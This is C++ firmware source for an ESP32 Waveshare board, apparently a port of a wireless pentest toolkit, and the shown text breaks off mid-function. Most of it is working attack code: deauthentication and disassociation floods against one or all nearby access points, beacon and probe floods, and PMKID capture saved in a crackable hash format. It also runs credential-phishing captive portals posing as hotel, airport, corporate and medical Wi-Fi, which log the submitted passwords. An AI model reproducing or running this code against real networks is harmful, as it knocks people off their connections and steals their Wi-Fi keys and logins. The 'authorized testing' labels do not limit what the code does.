#include "WaveshareCypherboxPort.h"

#include <DNSServer.h>
#include <NimBLEDevice.h>
#include <NimBLEHIDDevice.h>
#include <SD_MMC.h>
#include <WebServer.h>
#include <WiFi.h>
#include <esp_private/wifi.h>
#include <esp_wifi.h>

#include <WaveshareAmoledAppKit.h>

#include <algorithm>
#include <stdarg.h>
#include <string>
#include <vector>

#include "bt_hid/bt_hid_config.h"
#include "bt_hid/hid_ble.h"
#include "bt_hid/payload.h"

namespace WaveshareCypherbox {
namespace {

using namespace WaveshareAmoled;

constexpr const char* kRoot = "/waveshare-os/cypherbox";
constexpr const char* kLogDir = "/waveshare-os/cypherbox/logs";
constexpr const char* kPayloadDir = BT_HID_PAYLOAD_DIR;
constexpr const char* kWebSsid = "WAVE-CYPHERBOX";
constexpr const char* kWebPass = "cypherbox";
constexpr uint8_t kMaxNetworks = 24;
constexpr uint8_t kMaxBleDevices = 24;
constexpr uint8_t kWifiChannels = 14;
constexpr uint8_t kFramesPerBurst = 16;
constexpr uint32_t kPmkidTimeoutMs = 120000UL;
constexpr uint32_t kPmkidSolicitMs = 1500UL;

enum class Transport { Usb, Ble };
enum class Screen { WifiMenu, WifiAttacks, BleMenu };

struct WifiNetwork {
  String ssid;
  String bssid;
  int32_t rssi = 0;
  uint8_t channel = 1;
  wifi_auth_mode_t auth = WIFI_AUTH_OPEN;
};

struct BleDeviceInfo {
  char name[32] = "";
  char address[24] = "";
  char vendor[28] = "";
  char service[32] = "";
  int rssi = 0;
  bool connectable = false;
};

struct DeauthFrame {
  uint8_t frameControl[2];
  uint8_t duration[2];
  uint8_t station[6];
  uint8_t sender[6];
  uint8_t accessPoint[6];
  uint8_t fragmentSequence[2];
  uint16_t reason;
} __attribute__((packed));

struct AttackState {
  bool active = false;
  uint8_t type = 0;
  uint32_t frames = 0;
  uint32_t startedAt = 0;
  uint32_t lastSolicit = 0;
  uint16_t reason = 7;
  uint8_t apMac[6] = {};
  uint8_t selfMac[6] = {};
  uint8_t apList[kMaxNetworks][6] = {};
  uint8_t apChannels[kMaxNetworks] = {};
  uint8_t apCount = 0;
  uint8_t apCursor = 0;
  DeauthFrame deauth = {};
  DeauthFrame disassoc = {};
  bool pmkidFound = false;
  char pmkidSsid[33] = "";
  uint8_t pmkidAp[6] = {};
  uint8_t pmkidSta[6] = {};
  uint8_t pmkid[16] = {};
};

WifiNetwork wifiNetworks[kMaxNetworks];
uint8_t wifiCount = 0;
BleDeviceInfo bleDevices[kMaxBleDevices];
uint8_t bleCount = 0;
Screen screen = Screen::WifiMenu;
uint8_t selected = 0;
uint8_t top = 0;
bool redraw = true;
bool stopRequested = false;
WebServer webServer(80);
DNSServer* dnsServer = nullptr;
WebServer* portalServer = nullptr;
AttackState attack;
NimBLEScan* bleScan = nullptr;
NimBLEAdvertising* bleAdvertiser = nullptr;
NimBLECharacteristic* bleSerialTx = nullptr;
String bleSerialLine;
bool bleSerialReady = false;
volatile uint32_t hidPasskey = 0;

const char* const kWifiMenu[] = {
    "Scan APs", "Heatmap", "Captive Portal", "Attacks", "Web Server",
    "SD Files", "Help", "Launcher"};
const char* const kAttackMenu[] = {
    "Deauth Target", "Deauth All", "Beacon Flood", "Probe Flood",
    "PMKID Capture", "Back"};
const char* const kBleMenu[] = {
    "BLE Serial", "BLE Scan", "BLE Spam", "BT HID", "Mouse Jiggler",
    "Pairing", "SD Files", "Help", "Launcher"};
const char* const kPortalNames[] = {
    "Hotel/Guest", "Coffee Shop", "Corporate", "Airport", "Library",
    "Conference", "Retail", "Device Setup", "University", "Medical"};
const char* const kPortalSsids[] = {
    "GrandHotel_FreeWiFi", "BeanAndBrew_WiFi", "ACME_Corp_Secure",
    "SkyLink_Airport", "CityLibrary_Free", "TechSummit2026",
    "TechZone_WiFi", "SmartHome_Setup", "MetroU_Campus", "Wellness_Medical"};

void outPrint(Transport transport, const String& text) {
  if (transport == Transport::Ble && bleSerialTx) {
    bleSerialTx->setValue(text.c_str());
    bleSerialTx->notify();
  } else {
    Serial.print(text);
  }
}

void outPrintln(Transport transport, const String& text = "") {
  outPrint(transport, text + "\r\n");
}

void outPrintf(Transport transport, const char* fmt, ...) {
  char buf[256];
  va_list args;
  va_start(args, fmt);
  vsnprintf(buf, sizeof(buf), fmt, args);
  va_end(args);
  outPrint(transport, String(buf));
}

bool startsWithToken(const String& line, const char* token) {
  String t = token;
  return line.equalsIgnoreCase(t) || line.startsWith(t + " ");
}

String lowerCopy(String line) {
  line.trim();
  line.toLowerCase();
  return line;
}

void stopWifi() {
  webServer.stop();
  if (portalServer) {
    portalServer->stop();
    delete portalServer;
    portalServer = nullptr;
  }
  if (dnsServer) {
    dnsServer->stop();
    delete dnsServer;
    dnsServer = nullptr;
  }
  WiFi.scanDelete();
  WiFi.softAPdisconnect(true);
  WiFi.disconnect(true, true);
  WiFi.mode(WIFI_OFF);
}

void stopBle() {
  if (NimBLEDevice::isInitialized()) {
    NimBLEDevice::stopAdvertising();
    NimBLEDevice::deinit(true);
  }
  bleScan = nullptr;
  bleAdvertiser = nullptr;
  bleSerialTx = nullptr;
  bleSerialLine = "";
  bleSerialReady = false;
}

void radioWifiSta() {
  stopBle();
  WiFi.mode(WIFI_STA);
  WiFi.disconnect(false, true);
  delay(80);
}

void radioWifiAp() {
  stopBle();
  WiFi.mode(WIFI_AP);
  delay(80);
}

void radioBle() {
  stopWifi();
  delay(50);
}

void radioIdle() {
  stopWifi();
  stopBle();
}

bool ensureBaseDirs() {
  if (!sdReady() && !mountSd()) return false;
  ensureDir("/waveshare-os");
  ensureDir(kRoot);
  ensureDir(kLogDir);
  ensureDir(kPayloadDir);
  ensureDir("/waveshare-os/cypherbox/payloads/macos");
  return true;
}

uint16_t readCounter() {
  if (!ensureBaseDirs()) return 0;
  File f = SD_MMC.open("/waveshare-os/cypherbox/COUNTER.TXT", FILE_READ);
  if (!f) return 0;
  uint16_t n = static_cast<uint16_t>(f.parseInt());
  f.close();
  return n;
}

void writeCounter(uint16_t n) {
  if (!ensureBaseDirs()) return;
  File f = SD_MMC.open("/waveshare-os/cypherbox/COUNTER.TXT", FILE_WRITE);
  if (!f) return;
  f.println(n);
  f.close();
}

String nextFile(const char* prefix, const char* ext) {
  uint16_t n = readCounter() + 1;
  writeCounter(n);
  char path[96];
  snprintf(path, sizeof(path), "%s/%s_%03u.%s", kLogDir, prefix, n, ext);
  return String(path);
}

String csvEscape(const String& value) {
  bool quote = value.indexOf(',') >= 0 || value.indexOf('"') >= 0 ||
               value.indexOf('\n') >= 0 || value.indexOf('\r') >= 0;
  if (!quote) return value;
  String out = "\"";
  for (size_t i = 0; i < value.length(); i++) {
    if (value[i] == '"') out += "\"\"";
    else out += value[i];
  }
  out += "\"";
  return out;
}

String htmlEscape(const String& value) {
  String out;
  for (size_t i = 0; i < value.length(); i++) {
    char c = value[i];
    if (c == '&') out += F("&amp;");
    else if (c == '<') out += F("&lt;");
    else if (c == '>') out += F("&gt;");
    else if (c == '"') out += F("&quot;");
    else out += c;
  }
  return out;
}

const char* authName(wifi_auth_mode_t auth) {
  switch (auth) {
    case WIFI_AUTH_OPEN: return "OPEN";
    case WIFI_AUTH_WEP: return "WEP";
    case WIFI_AUTH_WPA_PSK: return "WPA";
    case WIFI_AUTH_WPA2_PSK: return "WPA2";
    case WIFI_AUTH_WPA_WPA2_PSK: return "WPA/WPA2";
    case WIFI_AUTH_WPA2_ENTERPRISE: return "WPA2-EAP";
    case WIFI_AUTH_WPA3_PSK: return "WPA3";
    case WIFI_AUTH_WPA2_WPA3_PSK: return "WPA2/3";
    default: return "UNKNOWN";
  }
}

void drawMenu(const char* title, const char* const* items, uint8_t count,
              const char* right = nullptr) {
  clear();
  header(title, right);
  if (selected >= count) selected = count ? count - 1 : 0;
  if (selected < top) top = selected;
  if (selected >= top + 5) top = selected - 4;
  const uint8_t visible = min<uint8_t>(5, count - top);
  for (uint8_t i = 0; i < visible; i++) {
    uint8_t idx = top + i;
    listItem(18, 58 + i * 58, 332, 48, items[idx],
             idx == selected ? "tap to run" : "", idx == selected, kColorAccent);
  }
  footer("Swipe/tap", "Hold BOOT home");
}

void drawStatus(const char* title, const char* a, const char* b = "",
                const char* c = "") {
  clear();
  header(title);
  wrapped(a, 18, 72, 30, 3, kColorText);
  wrapped(b, 18, 164, 30, 3, kColorDim);
  wrapped(c, 18, 256, 30, 4, kColorWarn);
  footer("BOOT stop/back", "Hold BOOT home");
}

bool handleUniversalEvent(const Event& event) {
  if (event.type == EventNone) return false;
  if (isHome(event)) returnToLauncher();
  if (isBack(event)) {
    stopRequested = true;
    return true;
  }
  if (event.type == EventSerialLine) {
    String line = lowerCopy(event.line);
    if (line == "stop" || line == "home") {
      stopRequested = true;
      if (line == "home") returnToLauncher();
      return true;
    }
    if (line.startsWith("nfc") || line.startsWith("apdu") || line.startsWith("gps") ||
        line.startsWith("wardriver")) {
      Serial.println("unsupported: this Waveshare port has no external PN532/GPS module");
      return true;
    }
  }
  return false;
}

bool pollStop() {
  Event event = poll();
  return handleUniversalEvent(event) || stopRequested;
}

void printSdList(Transport transport) {
  if (!ensureBaseDirs()) {
    outPrintln(transport, "sd: not ready");
    return;
  }
  File root = SD_MMC.open(kRoot);
  if (!root) {
    outPrintln(transport, "sd: open failed");
    return;
  }
  outPrintln(transport, "sd files under /waveshare-os/cypherbox:");
  while (true) {
    File entry = root.openNextFile();
    if (!entry) break;
    outPrintf(transport, "  %s%s %lu\r\n", entry.name(), entry.isDirectory() ? "/" : "",
              static_cast<unsigned long>(entry.size()));
    entry.close();
  }
  root.close();
}

void showSdFiles() {
  if (!ensureBaseDirs()) {
    message("SD Files", "SD card is not ready.", kColorWarn);
    return;
  }
  clear();
  header("SD Files", "cypherbox");
  File root = SD_MMC.open(kRoot);
  uint8_t row = 0;
  if (root) {
    while (row < 8) {
      File entry = root.openNextFile();
      if (!entry) break;
      display().setTextSize(1);
      display().setTextColor(kColorText, kColorBg);
      display().setCursor(18, 62 + row * 34);
      display().print(entry.name());
      display().setCursor(18, 76 + row * 34);
      display().setTextColor(kColorDim, kColorBg);
      display().printf("%s %lu bytes", entry.isDirectory() ? "dir" : "file",
                       static_cast<unsigned long>(entry.size()));
      entry.close();
      row++;
    }
    root.close();
  }
  if (row == 0) wrapped("No cypherbox files yet.", 18, 72, 30, 2);
  footer("BOOT back", "sd list");
}

void scanWifi(bool printTable = true) {
  radioWifiSta();
  drawStatus("WiFi Scan", "Scanning APs...", "This is passive discovery.");
  int n = WiFi.scanNetworks(false, true);
  wifiCount = min(max(n, 0), static_cast<int>(kMaxNetworks));
  for (uint8_t i = 0; i < wifiCount; i++) {
    wifiNetworks[i].ssid = WiFi.SSID(i);
    wifiNetworks[i].bssid = WiFi.BSSIDstr(i);
    wifiNetworks[i].rssi = WiFi.RSSI(i);
    wifiNetworks[i].channel = WiFi.channel(i);
    wifiNetworks[i].auth = static_cast<wifi_auth_mode_t>(WiFi.encryptionType(i));
  }
  if (printTable) {
    Serial.printf("wifi networks=%u\n", wifiCount);
    for (uint8_t i = 0; i < wifiCount; i++) {
      Serial.printf("  %02u ch=%u rssi=%ld auth=%s bssid=%s ssid=\"%s\"\n",
                    i + 1, wifiNetworks[i].channel, static_cast<long>(wifiNetworks[i].rssi),
                    authName(wifiNetworks[i].auth), wifiNetworks[i].bssid.c_str(),
                    wifiNetworks[i].ssid.length() ? wifiNetworks[i].ssid.c_str() : "(hidden)");
    }
  }
}

void runWifiScan() {
  stopRequested = false;
  scanWifi();
  uint8_t idx = 0;
  while (!stopRequested) {
    clear();
    String right = String(wifiCount) + " APs";
    header("WiFi Scan", right.c_str());
    if (wifiCount == 0) {
      wrapped("No networks found. Swipe or BOOT to leave.", 18, 72, 30, 3, kColorWarn);
    } else {
      WifiNetwork& net = wifiNetworks[idx];
      wrapped(net.ssid.length() ? net.ssid.c_str() : "(hidden)", 18, 72, 30, 2, kColorText);
      char line[96];
      snprintf(line, sizeof(line), "ch %u  %ld dBm  %s", net.channel,
               static_cast<long>(net.rssi), authName(net.auth));
      wrapped(line, 18, 144, 30, 2);
      wrapped(net.bssid.c_str(), 18, 218, 30, 1, kColorDim);
      wrapped("Swipe up/down to browse. Tap to rescan.", 18, 290, 30, 3, kColorDim);
    }
    footer("BOOT back", "Tap rescan");
    while (!stopRequested) {
      Event event = poll();
      if (handleUniversalEvent(event)) break;
      if (event.type == EventSwipeUp || event.type == EventSwipeLeft) {
        if (wifiCount) idx = (idx + 1) % wifiCount;
        break;
      }
      if (event.type == EventSwipeDown || event.type == EventSwipeRight) {
        if (wifiCount) idx = (idx + wifiCount - 1) % wifiCount;
        break;
      }
      if (event.type == EventTap) {
        scanWifi();
        idx = 0;
        break;
      }
      delay(15);
    }
  }
  stopRequested = false;
  radioIdle();
  redraw = true;
}

void runWifiHeatmap() {
  stopRequested = false;
  radioWifiSta();
  uint32_t last = 0;
  int8_t rssi[kWifiChannels];
  uint8_t count[kWifiChannels];
  while (!pollStop()) {
    if (millis() - last >= 2000 || last == 0) {
      memset(rssi, -100, sizeof(rssi));
      memset(count, 0, sizeof(count));
      int n = WiFi.scanNetworks(false, true);
      for (int i = 0; i < n; i++) {
        int ch = WiFi.channel(i);
        if (ch < 1 || ch > kWifiChannels) continue;
        uint8_t idx = ch - 1;
        int32_t v = WiFi.RSSI(i);
        if (count[idx] == 0 || v > rssi[idx]) rssi[idx] = constrain(v, -100, -30);
        if (count[idx] < 255) count[idx]++;
      }
      clear();
      String right = String(max(n, 0)) + " APs";
      header("WiFi Heatmap", right.c_str());
      display().drawFastHLine(18, 360, 332, kColorPanel2);
      for (uint8_t ch = 1; ch <= kWifiChannels; ch++) {
        int x = 22 + (ch - 1) * 23;
        int h = count[ch - 1] ? map(rssi[ch - 1], -95, -35, 8, 220) : 3;
        display().fillRect(x, 360 - h, 14, h, count[ch - 1] ? kColorAccent : kColorDim);
        display().setTextSize(1);
        display().setTextColor(kColorDim, kColorBg);
        display().setCursor(x, 372);
        display().print(ch);
      }
      wrapped("Live passive channel view. BOOT or serial stop exits.", 18, 404, 30, 1, kColorDim);
      last = millis();
    }
    delay(20);
  }
  stopRequested = false;
  radioIdle();
  redraw = true;
}

String portalHtml(uint8_t templateIndex) {
  String name = kPortalNames[templateIndex];
  String html = F("<!doctype html><html><head><meta name='viewport' content='width=device-width,initial-scale=1'>");
  html += "<title>" + htmlEscape(name) + "</title>";
  html += F("<style>body{font-family:Arial,sans-serif;background:#101820;color:#f7fbff;display:flex;min-height:100vh;align-items:center;justify-content:center;margin:0}.box{background:#fff;color:#17212b;border-radius:14px;padding:28px;max-width:390px;width:88%;box-shadow:0 20px 60px #0007}input,button{box-sizing:border-box;width:100%;padding:13px;margin:8px 0;border-radius:8px;border:1px solid #b9c4ce;font-size:16px}button{background:#00a6a6;color:white;border:0;font-weight:700}.note{color:#596671;font-size:12px}</style></head><body><div class='box'>");
  html += "<h1>" + htmlEscape(name) + "</h1><p>Authorized captive-portal test page.</p>";
  html += F("<form method='POST' action='/submit'><input name='id' placeholder='User or room'><input name='secret' placeholder='Password or access code' type='password'><button>Connect</button></form><p class='note'>Lab capture surface. Use only with permission.</p></div></body></html>");
  return html;
}

void logCapture(uint8_t templateIndex, const String& data) {
  if (!ensureBaseDirs()) return;
  File f = SD_MMC.open("/waveshare-os/cypherbox/logs/captive_log.csv", FILE_APPEND);
  if (!f) return;
  if (f.size() == 0) f.println("uptime_ms,template,data");
  f.print(millis());
  f.print(',');
  f.print(csvEscape(kPortalNames[templateIndex]));
  f.print(',');
  f.println(csvEscape(data));
  f.close();
}

void stopPortal() {
  if (portalServer) {
    portalServer->stop();
    delete portalServer;
    portalServer = nullptr;
  }
  if (dnsServer) {
    dnsServer->stop();
    delete dnsServer;
    dnsServer = nullptr;
  }
  WiFi.softAPdisconnect(true);
}

void runCaptivePortal(uint8_t startTemplate = 0) {
  stopRequested = false;
  uint8_t choice = startTemplate;
  while (!stopRequested) {
    clear();
    String right = String(choice) + "/9";
    header("Captive Portal", right.c_str());
    wrapped(kPortalNames[choice], 18, 86, 30, 2, kColorText);
    wrapped(kPortalSsids[choice], 18, 158, 30, 2, kColorAccent);
    wrapped("Active AP test page. Tap to launch, swipe to choose.", 18, 250, 30, 4, kColorWarn);
    footer("BOOT cancel", "Tap launch");
    Event e = poll();
    if (handleUniversalEvent(e)) break;
    if (e.type == EventSwipeUp || e.type == EventSwipeLeft) choice = (choice + 1) % 10;
    if (e.type == EventSwipeDown || e.type == EventSwipeRight) choice = (choice + 9) % 10;
    if (e.type == EventTap) break;
    delay(20);
  }
  if (stopRequested) {
    stopRequested = false;
    redraw = true;
    return;
  }

  radioWifiAp();
  WiFi.softAP(kPortalSsids[choice]);
  dnsServer = new DNSServer();
  portalServer = new WebServer(80);
  dnsServer->start(53, "*", WiFi.softAPIP());
  portalServer->on("/", HTTP_GET, [choice]() { portalServer->send(200, "text/html", portalHtml(choice)); });
  portalServer->on("/generate_204", HTTP_GET, [choice]() { portalServer->send(200, "text/html", portalHtml(choice)); });
  portalServer->on("/hotspot-detect.html", HTTP_GET, [choice]() { portalServer->send(200, "text/html", portalHtml(choice)); });
  portalServer->on("/submit", HTTP_POST, [choice]() {
    String data;
    for (uint8_t i = 0; i < portalServer->args(); i++) {
      if (i) data += ' ';
      data += portalServer->argName(i) + "=" + portalServer->arg(i);
    }
    logCapture(choice, data);
    portalServer->send(200, "text/html", "<h1>Connected</h1><p>Session active.</p>");
  });
  portalServer->onNotFound([choice]() { portalServer->send(200, "text/html", portalHtml(choice)); });
  portalServer->begin();
  Serial.printf("portal ssid=%s ip=%s\n", kPortalSsids[choice], WiFi.softAPIP().toString().c_str());

  while (!pollStop()) {
    dnsServer->processNextRequest();
    portalServer->handleClient();
    clear();
    String right = String(WiFi.softAPgetStationNum()) + " clients";
    header("Portal Active", right.c_str());
    wrapped(kPortalSsids[choice], 18, 76, 30, 2, kColorAccent);
    wrapped("http://192.168.4.1", 18, 152, 30, 1, kColorText);
    wrapped("Captures append to logs/captive_log.csv", 18, 230, 30, 3, kColorDim);
    footer("BOOT stop", "serial stop");
    uint32_t start = millis();
    while (millis() - start < 900 && !pollStop()) {
      dnsServer->processNextRequest();
      portalServer->handleClient();
      delay(3);
    }
  }
  stopRequested = false;
  stopPortal();
  radioIdle();
  redraw = true;
}

String urlEncode(const String& in) {
  const char* hex = "0123456789ABCDEF";
  String out;
  for (size_t i = 0; i < in.length(); i++) {
    uint8_t c = static_cast<uint8_t>(in[i]);
    if (isalnum(c) || c == '-' || c == '_' || c == '.') out += static_cast<char>(c);
    else {
      out += '%';
      out += hex[c >> 4];
      out += hex[c & 0x0F];
    }
  }
  return out;
}

void startReadOnlyWeb() {
  stopRequested = false;
  if (!ensureBaseDirs()) {
    message("Web Server", "SD card is not ready.", kColorWarn);
    return;
  }
  radioWifiAp();
  WiFi.softAP(kWebSsid, kWebPass);
  webServer.on("/", HTTP_GET, []() {
    String html = F("<!doctype html><html><head><meta name='viewport' content='width=device-width,initial-scale=1'><style>body{font-family:Arial;background:#071011;color:#e9fffb}a{color:#64fff3}table{width:100%;border-collapse:collapse}td,th{border-bottom:1px solid #21464a;padding:8px;text-align:left}</style></head><body><h1>Waveshare Cypherbox SD</h1><p>Read-only browser.</p><table><tr><th>Name</th><th>Size</th><th>Open</th></tr>");
    File root = SD_MMC.open(kRoot);
    while (root) {
      File e = root.openNextFile();
      if (!e) break;
      if (!e.isDirectory()) {
        String name = String(e.name());
        html += "<tr><td>" + htmlEscape(name) + "</td><td>" + String(e.size()) +
                "</td><td><a href='/view?name=" + urlEncode(name) + "'>view</a></td></tr>";
      }
      e.close();
    }
    if (root) root.close();
    html += F("</table></body></html>");
    webServer.send(200, "text/html", html);
  });
  webServer.on("/api/status", HTTP_GET, []() {
    String json = "{\"sd\":\"";
    json += sdReady() ? "ready" : "error";
    json += "\",\"clients\":";
    json += WiFi.softAPgetStationNum();
    json += ",\"uptime_ms\":";
    json += millis();
    json += "}";
    webServer.send(200, "application/json", json);
  });
  webServer.on("/view", HTTP_GET, []() {
    String name = webServer.arg("name");
    if (name.indexOf("..") >= 0 || name.indexOf("\\") >= 0) {
      webServer.send(400, "text/plain", "bad name");
      return;
    }
    if (!name.startsWith(kRoot)) name = String(kRoot) + "/" + name;
    File f = SD_MMC.open(name, FILE_READ);
    if (!f) {
      webServer.send(404, "text/plain", "not found");
      return;
    }
    webServer.streamFile(f, "text/plain");
    f.close();
  });
  webServer.begin();
  while (!pollStop()) {
    webServer.handleClient();
    clear();
    String right = String(WiFi.softAPgetStationNum()) + " clients";
    header("SD Web", right.c_str());
    wrapped(kWebSsid, 18, 78, 30, 1, kColorAccent);
    wrapped(kWebPass, 18, 124, 30, 1, kColorDim);
    wrapped("http://192.168.4.1", 18, 184, 30, 1, kColorText);
    wrapped("Read-only SD browser for /waveshare-os/cypherbox.", 18, 256, 30, 3, kColorDim);
    footer("BOOT stop", "serial stop");
    uint32_t start = millis();
    while (millis() - start < 900 && !pollStop()) {
      webServer.handleClient();
      delay(3);
    }
  }
  stopRequested = false;
  webServer.stop();
  radioIdle();
  redraw = true;
}

bool macFromString(const String& input, uint8_t out[6]) {
  unsigned int b[6];
  if (sscanf(input.c_str(), "%x:%x:%x:%x:%x:%x", &b[0], &b[1], &b[2], &b[3], &b[4], &b[5]) != 6) {
    return false;
  }
  for (uint8_t i = 0; i < 6; i++) out[i] = static_cast<uint8_t>(b[i]);
  return true;
}

void buildMgmtFrame(DeauthFrame& frame, const uint8_t* dest, const uint8_t* ap,
                    uint8_t subtype, uint16_t reason) {
  memset(&frame, 0, sizeof(frame));
  frame.frameControl[0] = subtype;
  frame.duration[0] = 0x01;
  memcpy(frame.station, dest, 6);
  memcpy(frame.sender, ap, 6);
  memcpy(frame.accessPoint, ap, 6);
  frame.reason = reason;
}

void setupAttackRadio(uint8_t channel) {
  WiFi.mode(WIFI_STA);
  esp_wifi_set_promiscuous(true);
  esp_wifi_set_channel(channel ? channel : 1, WIFI_SECOND_CHAN_NONE);
}

void stopAttack() {
  esp_wifi_set_promiscuous_rx_cb(nullptr);
  esp_wifi_set_promiscuous(false);
  attack.active = false;
}

void savePmkid() {
  if (!ensureBaseDirs()) return;
  static const char* hex = "0123456789abcdef";
  auto appendHex = [&](String& s, const uint8_t* data, uint8_t len) {
    for (uint8_t i = 0; i < len; i++) {
      s += hex[data[i] >> 4];
      s += hex[data[i] & 0x0F];
    }
  };
  String line = "WPA*01*";
  appendHex(line, attack.pmkid, 16);
  line += '*';
  appendHex(line, attack.pmkidAp, 6);
  line += '*';
  appendHex(line, attack.pmkidSta, 6);
  line += '*';
  appendHex(line, reinterpret_cast<const uint8_t*>(attack.pmkidSsid), strlen(attack.pmkidSsid));
  line += "***";
  String path = nextFile("pmkid", "22000");
  File f = SD_MMC.open(path, FILE_WRITE);
  if (f) {
    f.println(line);
    f.close();
  }
  Serial.printf("pmkid saved %s\n", path.c_str());
}

void sendPmkidSolicit() {
  uint8_t auth[30] = {0};
  auth[0] = 0xB0;
  auth[2] = 0x3A;
  auth[3] = 0x01;
  memcpy(auth + 4, attack.apMac, 6);
  memcpy(auth + 10, attack.selfMac, 6);
  memcpy(auth + 16, attack.apMac, 6);
  auth[26] = 0x01;
  esp_wifi_internal_tx(WIFI_IF_STA, auth, sizeof(auth));
  attack.frames++;

  uint8_t frame[128];
  int n = 0;
  frame[n++] = 0x00; frame[n++] = 0x00;
  frame[n++] = 0x3A; frame[n++] = 0x01;
  memcpy(frame + n, attack.apMac, 6); n += 6;
  memcpy(frame + n, attack.selfMac, 6); n += 6;
  memcpy(frame + n, attack.apMac, 6); n += 6;
  frame[n++] = 0x00; frame[n++] = 0x00;
  frame[n++] = 0x11; frame[n++] = 0x00;
  frame[n++] = 0x0A; frame[n++] = 0x00;
  uint8_t slen = min<uint8_t>(strlen(attack.pmkidSsid), 32);
  frame[n++] = 0x00; frame[n++] = slen;
  memcpy(frame + n, attack.pmkidSsid, slen); n += slen;
  const uint8_t rates[] = {0x01,0x08,0x82,0x84,0x8B,0x96,0x24,0x30,0x48,0x6C};
  memcpy(frame + n, rates, sizeof(rates)); n += sizeof(rates);
  const uint8_t rsn[] = {
      0x30,0x14,0x01,0x00,0x00,0x0F,0xAC,0x04,0x01,0x00,0x00,0x0F,
      0xAC,0x04,0x01,0x00,0x00,0x0F,0xAC,0x02,0x00,0x00};
  memcpy(frame + n, rsn, sizeof(rsn)); n += sizeof(rsn);
  esp_wifi_internal_tx(WIFI_IF_STA, frame, n);
  attack.frames++;
}

void IRAM_ATTR pmkidSniffer(void* buf, wifi_promiscuous_pkt_type_t type) {
  (void)type;
  if (attack.pmkidFound) return;
  wifi_promiscuous_pkt_t* packet = reinterpret_cast<wifi_promiscuous_pkt_t*>(buf);
  const uint8_t* p = packet->payload;
  int len = packet->rx_ctrl.sig_len;
  if (len < 36) return;
  if (((p[0] >> 2) & 0x03) != 2) return;
  int hdr = 24;
  if (((p[0] >> 4) & 0x0F) & 0x08) hdr += 2;
  if (memcmp(p + 16, attack.apMac, 6) != 0) return;
  if (len < hdr + 8) return;
  const uint8_t* llc = p + hdr;
  if (!(llc[0] == 0xAA && llc[1] == 0xAA && llc[2] == 0x03 &&
        llc[6] == 0x88 && llc[7] == 0x8E)) return;
  const uint8_t* eapol = llc + 8;
  int eapolLen = len - (hdr + 8);
  if (eapolLen < 99 || eapol[1] != 0x03) return;
  const uint8_t* key = eapol + 4;
  uint16_t keyInfo = (key[1] << 8) | key[2];
  if (!(keyInfo & 0x0080) || (keyInfo & 0x0100)) return;
  int keyDataLen = (key[93] << 8) | key[94];
  int avail = (eapolLen - 4) - 95;
  if (keyDataLen > avail) keyDataLen = avail;
  const uint8_t* kd = key + 95;
  for (int i = 0; i + 2 <= keyDataLen;) {
    uint8_t id = kd[i];
    uint8_t l = kd[i + 1];
    if (id == 0xDD && l >= 0x14 && i + 22 <= keyDataLen &&
        kd[i + 2] == 0x00 && kd[i + 3] == 0x0F && kd[i + 4] == 0xAC &&
        kd[i + 5] == 0x04) {
      memcpy(attack.pmkid, kd + i + 6, 16);
      memcpy(attack.pmkidAp, p + 10, 6);
      memcpy(attack.pmkidSta, p + 4, 6);
      attack.pmkidFound = true;
      return;
    }
    i += 2 + l;
  }
}

void attackLoop(const char* title) {
  uint8_t broadcast[6] = {0xff,0xff,0xff,0xff,0xff,0xff};
  while (!pollStop()) {
    switch (attack.type) {
      case 1:
        for (uint8_t i = 0; i < kFramesPerBurst; i++) {
          esp_wifi_internal_tx(WIFI_IF_STA, &attack.deauth, sizeof(attack.deauth));
          esp_wifi_internal_tx(WIFI_IF_STA, &attack.disassoc, sizeof(attack.disassoc));
          attack.frames += 2;
        }
        break;
      case 2:
        if (attack.apCount) {
          attack.apCursor = (attack.apCursor + 1) % attack.apCount;
          esp_wifi_set_channel(attack.apChannels[attack.apCursor], WIFI_SECOND_CHAN_NONE);
          buildMgmtFrame(attack.deauth, broadcast, attack.apList[attack.apCursor], 0xC0, attack.reason);
          buildMgmtFrame(attack.disassoc, broadcast, attack.apList[attack.apCursor], 0xA0, attack.reason);
          for (uint8_t i = 0; i < kFramesPerBurst; i++) {
            esp_wifi_internal_tx(WIFI_IF_STA, &attack.deauth, sizeof(attack.deauth));
            esp_wifi_internal_tx(WIFI_IF_STA, &attack.disassoc, sizeof(attack.disassoc));
            attack.frames += 2;
          }
        }
        break;
      case 3: {
        const char* names[] = {"FreePublicWiFi", "Guest", "Airport_Free", "Hotel_Guest",
                               "Coffee_WiFi", "Conference", "xfinitywifi", "Public_Hotspot"};
        for (uint8_t i = 0; i < 8; i++) {
          uint8_t beacon[128] = {};
          uint8_t mac[6];
          esp_fill_random(mac, 6);
          beacon[0] = 0x80;
          memset(beacon + 4, 0xff, 6);
          memcpy(beacon + 10, mac, 6);
          memcpy(beacon + 16, mac, 6);
          beacon[32] = 0x64;
          beacon[34] = 0x10;
          beacon[37] = strlen(names[i]);
          memcpy(beacon + 38, names[i], beacon[37]);
          esp_wifi_internal_tx(WIFI_IF_STA, beacon, sizeof(beacon));
          attack.frames++;
        }
        break;
      }
      case 4: {
        uint8_t probe[64] = {};
        uint8_t mac[6];
        esp_fill_random(mac, 6);
        const char* target = "FreePublicWiFi";
        probe[0] = 0x40;
        memset(probe + 4, 0xff, 6);
        memcpy(probe + 10, mac, 6);
        probe[19] = strlen(target);
        memcpy(probe + 20, target, probe[19]);
        for (uint8_t i = 0; i < 10; i++) {
          esp_wifi_internal_tx(WIFI_IF_STA, probe, sizeof(probe));
          attack.frames++;
        }
        break;
      }
      case 5:
        if (!attack.pmkidFound && millis() - attack.lastSolicit >= kPmkidSolicitMs) {
          sendPmkidSolicit();
          attack.lastSolicit = millis();
        }
        if (attack.pmkidFound || millis() - attack.startedAt >= kPmkidTimeoutMs) {
          if (attack.pmkidFound) savePmkid();
          stopRequested = true;
        }
        break;
    }
    clear();
    String right = String(attack.frames);
    header(title, right.c_str());
    wrapped("Authorized testing only.", 18, 78, 30, 1, kColorWarn);
    wrapped(attack.pmkidFound ? "PMKID captured and saved." : "Frames running. BOOT or stop exits.",
            18, 142, 30, 3, kColorText);
    footer("BOOT stop", "serial stop");
    delay(40);
  }
  stopAttack();
  stopRequested = false;
  radioIdle();
  redraw = true;
}

int pickNetwork(const char* title) {
  scanWifi(false);
  if (wifiCount == 0) {
    message(title, "No networks found.", kColorWarn);
    delay(900);
    return -1;
  }
  uint8_t idx = 0;
  stopRequested = false;
  while (!stopRequested) {
    clear();
    String right = String(idx + 1) + "/" + String(wifiCount);
    header(title, right.c_str());
    wrapped(wifiNetworks[idx].ssid.length() ? wifiNetworks[idx].ssid.c_str() : "(hidden)",
            18, 86, 30, 2, kColorText);
